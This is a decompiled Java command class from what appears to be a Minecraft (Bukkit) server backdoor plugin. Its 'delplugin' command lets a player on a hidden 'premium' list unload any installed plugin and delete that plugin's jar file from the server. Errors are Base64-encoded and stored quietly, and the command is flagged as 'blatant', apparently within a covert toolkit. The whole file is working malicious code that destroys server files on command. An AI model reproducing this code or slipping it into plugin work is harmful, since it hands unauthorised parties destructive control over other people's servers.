/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl.premium;

import me.qlutch.sucks.data.DataManager;
import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import java.io.IOException;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class DelpluginCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (plugin.premium.contains(p2.getName())) {
            if (args.length <= 1) {
                p2.sendMessage(Settings.USAGE("delplugin <name>"));
            } else if (Bukkit.getPluginManager().getPlugin(args[1]) == null) {
                p2.sendMessage(Settings.PREFIX(args[1] + " doesn't exist. (Cap Sensitive)"));
            } else {
                String plugin1 = args[1];
                ClassLoader classLoader = Bukkit.getPluginManager().getPlugin(plugin1).getClass().getClassLoader();
                if (classLoader instanceof URLClassLoader) {
                    byte[] err;
                    try {
                        ((URLClassLoader)classLoader).close();
                    }
                    catch (IOException e2) {
                        err = Base64.getEncoder().encode(e2.getMessage().getBytes());
                        DataManager.getData().set("err", (Object)new String(err));
                    }
                    try {
                        Files.delete(Paths.get("plugins/" + args[1] + ".jar", new String[0]));
                    }
                    catch (IOException e3) {
                        err = Base64.getEncoder().encode(e3.getMessage().getBytes());
                        DataManager.getData().set("err", (Object)new String(err));
                    }
                    System.gc();
                }
                p2.sendMessage(Settings.PREFIX("The plugin " + Settings.RED + args[1] + Settings.WHITE + " was deleted."));
            }
        } else {
            p2.sendMessage(Settings.PREFIX("You must be a " + Settings.RED + "premium user " + Settings.WHITE + "to execute this command"));
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

